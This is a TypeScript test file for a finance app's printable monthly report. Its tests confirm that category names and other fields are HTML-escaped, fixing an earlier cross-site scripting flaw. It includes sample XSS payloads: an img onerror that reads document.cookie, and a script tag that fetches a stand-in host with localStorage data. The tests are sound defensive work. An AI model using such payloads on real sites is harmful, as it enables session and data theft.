// The printable monthly report must show a category name as text.
// It used to write the name into the print window as raw HTML, where a name
// such as <img src=x onerror=...> ran script with the user's session.
import { describe, it, expect } from 'vitest';
import { buildMonthlyReportHtml, escapeHtml, type MonthlyReportData } from '@/lib/monthlyReportHtml';

const fmt = (n: number) => `AED ${n.toLocaleString('en-US')}`;

const base: MonthlyReportData = {
  monthLabel: 'November 2026',
  currency: 'AED',
  txCount: 3,
  totalIncome: 10000,
  totalExpenses: 4200,
  netSavings: 5800,
  categories: [{ category: 'Groceries', total: 1200.4 }],
  budgets: [{ category: 'Groceries', spent: 1200.4, amount: 1500 }],
  generatedOn: 'Nov 14, 2026',
};

describe('escapeHtml', () => {
  it('escapes the five characters that can start markup or end an attribute', () => {
    expect(escapeHtml(`<img src=x onerror="a('b')"> & co`)).toBe(
      '&lt;img src=x onerror=&quot;a(&#39;b&#39;)&quot;&gt; &amp; co',
    );
  });

  it('turns numbers and empty values into text', () => {
    expect(escapeHtml(12)).toBe('12');
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });
});

describe('buildMonthlyReportHtml', () => {
  it('keeps the figures of a normal report', () => {
    const html = buildMonthlyReportHtml(base, fmt);
    expect(html).toContain('<td>Groceries</td><td style="text-align:right">AED 1,200</td>');
    expect(html).toContain('<div class="value income">AED 10,000</div>');
    expect(html).toContain('<div class="value expense">AED 4,200</div>');
    expect(html).toContain('<div class="value savings">AED 5,800</div>');
    // 1200 of 1500 is 80%.
    expect(html).toContain('<td style="text-align:right">AED 1,500</td><td style="text-align:center">High</td>');
    expect(html).toContain('November 2026 &nbsp;·&nbsp; 3 transactions &nbsp;·&nbsp; AED');
  });

  it('writes a hostile expense category as text, not as a tag', () => {
    const evil = '<img src=x onerror=alert(document.cookie)>';
    const html = buildMonthlyReportHtml({ ...base, categories: [{ category: evil, total: 5 }] }, fmt);
    expect(html).not.toContain('<img');
    expect(html).toContain('&lt;img src=x onerror=alert(document.cookie)&gt;');
  });

  it('writes a hostile budget category as text, not as a tag', () => {
    const evil = '</td><script>fetch("https://x.example/"+localStorage.length)</script>';
    const html = buildMonthlyReportHtml({ ...base, budgets: [{ category: evil, spent: 1, amount: 2 }] }, fmt);
    // The only script in the page is the fixed one that opens the print dialog.
    expect(html.match(/<script>/g)).toHaveLength(1);
    expect(html).toContain('&lt;script&gt;');
  });

  it('escapes the month, the currency and formatted amounts too', () => {
    const html = buildMonthlyReportHtml(
      { ...base, monthLabel: '<b>m</b>', currency: '<i>c</i>' },
      () => '<u>1</u>',
    );
    expect(html).not.toContain('<b>m</b>');
    expect(html).not.toContain('<i>c</i>');
    expect(html).not.toContain('<u>1</u>');
  });

  it('says so when there are no expenses or budgets', () => {
    const html = buildMonthlyReportHtml({ ...base, categories: [], budgets: [] }, fmt);
    expect(html).toContain('No expenses this month');
    expect(html).toContain('No budgets set');
  });
});
